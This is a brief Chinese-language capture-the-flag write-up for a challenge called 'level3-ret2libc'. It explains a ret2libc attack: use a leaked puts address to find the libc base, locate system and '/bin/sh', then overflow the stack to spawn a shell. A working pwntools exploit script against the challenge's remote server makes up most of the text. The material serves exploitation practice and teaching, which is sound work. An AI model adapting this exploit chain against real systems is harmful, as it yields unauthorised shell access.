# level3-ret2libc
### 分析：
1. 通过给出的puts地址，可以推算出libc加载的地址
2. 通过libc得到system和"/bin/sh"的地址
3. 溢出时，调用system函数，传"/bin/sh"参数可以执行shell

##### 注：system函数的作用是执行各种命令行下的指令

```
from pwn import *

r = remote("pwn.sixstars.team","22003")
elf  = ELF("./level3-ret2libc")
libc = ELF("./libc-2.23.so")

sh_addr = list(libc.search("/bin/sh"))[0]
print hex(sh_addr)

exeve_addr =libc.sym["system"]# 0xaf590
print hex(exeve_addr)

s1 = r.recvline()
s2 = r.recvline()

puts_p = libc.sym["puts"]
puts_addr = int(s2[-9:], 16)
print hex(puts_addr)
base_addr = puts_addr - puts_p

real_exeve = base_addr + exeve_addr
real_sh = base_addr + sh_addr

payload = 'a'*0x28 + 'a' * 4
code = p32(real_exeve) +p32(0) + p32(real_sh)# + p32(real_sh)+ p32(0)

r.send(payload + code)
r.interactive()
```
